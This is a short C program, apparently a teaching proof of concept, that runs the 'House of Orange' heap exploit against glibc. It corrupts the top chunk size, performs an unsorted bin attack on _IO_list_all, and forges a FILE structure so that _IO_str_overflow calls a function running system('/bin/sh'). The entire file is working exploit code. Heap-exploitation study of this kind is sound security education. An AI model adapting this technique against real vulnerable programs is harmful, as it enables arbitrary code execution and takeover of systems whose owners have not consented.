#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int winner ( char *ptr);
int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;
    // unsorted bin attack
    p1 = malloc(0x400-16);
    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;
    p2 = malloc(0x1000);
    io_list_all = top[2] + 0x9a8;
    top[3] = io_list_all - 0x10;
    // _IO_str_overflow conditions
    char binsh_in_libc[] = "/bin/sh\x00"; // we can found "/bin/sh" in libc, here i create it in stack
    top[0] = ~1;
    top[7] = ((size_t)&binsh_in_libc); // buf_base
    // house_of_orange conditions
    top[1] = 0x61;
    top[24] = 1;
    top[21] = 2;
    top[22] = 3;
    top[20] = (size_t) &top[18];
    top[27] = (size_t)stdin - 0x1140 - 0x8;
    top[29] = &winner;
    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);
    return 0;
}
int winner(char *ptr)
{ 
    system(ptr);
    return 0;
}
